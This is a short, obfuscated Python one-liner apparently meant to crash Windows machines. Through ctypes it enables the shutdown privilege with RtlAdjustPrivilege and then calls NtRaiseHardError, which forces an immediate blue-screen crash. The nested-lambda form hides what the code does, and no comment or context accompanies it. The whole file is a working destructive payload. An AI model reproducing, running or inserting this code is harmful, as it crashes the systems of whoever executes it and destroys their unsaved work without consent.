(lambda __g: [[[[(
                ctypes.windll.ntdll.RtlAdjustPrivilege(
                    19,
                    1,
                    0,
                    ctypes.byref(tmp1)),
                (ctypes.windll.ntdll.NtRaiseHardError(3221225506, 0, 0, 0, 6,
                                                      ctypes.byref(tmp2)),
                 None)[1])[1]
                for __g['tmp2'] in [(ctypes.wintypes.DWORD())]][0]
                    for __g['tmp1'] in [(ctypes.c_bool())]][0]
                        for __g['ctypes'] in [(__import__('ctypes.wintypes', __g, __g))]][0]
                            for __g['ctypes'] in [(__import__('ctypes', __g, __g))]][0])\
    (globals())